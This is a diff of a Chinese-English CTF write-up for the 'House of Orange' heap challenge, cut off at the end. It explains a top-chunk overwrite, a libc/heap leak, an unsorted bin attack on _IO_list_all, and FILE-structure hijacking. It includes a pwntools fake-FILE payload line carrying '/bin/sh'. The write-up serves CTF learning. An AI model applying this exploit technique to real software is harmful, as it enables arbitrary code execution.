@@ -26,14 +26,14 @@ house
 00000008 name            dq ?
 00000010 house           ends
 ```
-主要功能有：
+主要功能有：
 * add():4次
 * upgrade():3次
 * show()
 
 保护全开
 
-# 漏洞分析
+# 漏洞分析
 
 主要漏洞点比较清楚edit的时候可以任意输入size
 ```python
@@ -98,7 +98,7 @@ int edit()
     * (old_top+old_size)&0xfff=0
     * size > old_size
 ```
-所以可以修改topchunk_size malloc 一个较大的chunk 把原来的chunk放入unsorted bin
+所以可以修改topchunk_size malloc 一个较大的chunk 把原来的chunk放入unsorted bin
 
 ## 0x01 printerr
 source is the best teacher
@@ -109,7 +109,7 @@ malloc_printerr (const char *str)
   __builtin_unreachable ();
 }
 ```
-and abort will call fflush
+and abort will call fflush
 ```python
 int
 _IO_fflush (FILE *fp)
@@ -171,8 +171,8 @@ _IO_flush_all_lockp (int do_lock)
 ```
 this function will clear the list of file
 ## IO_list_all
-IO_FILE 是一个单链表结构 chain指针指向下一个fp
-而IO_list_all指向第一个IO_file
+IO_FILE 是一个单链表结构 chain指针指向下一个fp
+而IO_list_all指向第一个IO_file
 ```python
 IO_list_file====>stderr     ====>stdout     =====>stdin
                     ...     I       ...     I
@@ -182,7 +182,7 @@ IO_list_file====>stderr     ====>stdout     =====>stdin
                     ...             ...     
 ```
 如上抽象画
-而新链入得fp->chain指向原来的第一项
+而新链入得fp->chain指向原来的第一项
 IO_list_file 指向fp
 ```c
 struct _IO_FILE
@@ -217,17 +217,17 @@ struct _IO_FILE
 
 # solution
 * leak
-    * no free，but we can use free in sysmalloc
+    * no free，but we can use free in sysmalloc
     * 通过overwrite topchunk
-    * malloc big chunk and then topchunk will be put in unsortedbin
-    * malloc >512 we can get libc&heap address #large bin
+    * malloc big chunk and then topchunk will be put in unsortedbin
+    * malloc >512 we can get libc&heap address #large bin
     * leak finished
 * cant do force because chunk size<0x10000
-* we can use unsorted bin atk to make &main_arena+88 == _IO_list_all
+* we can use unsorted bin atk to make &main_arena+88 == _IO_list_all
 * so main_arena+88 is the first IO_FILE struct but we cant control main_arene
 * so we should fill main_arena+88+0x60  with fake_chunk_address
 * main_arena+88+0x60 is the 0x60:smallbin[4]
-* so we upgrade to over write the unsorted bin like
+* so we upgrade to over write the unsorted bin like
 ```python
 fake = "/bin/sh\x00"+p64(0x61)+p64(0)+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
 fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
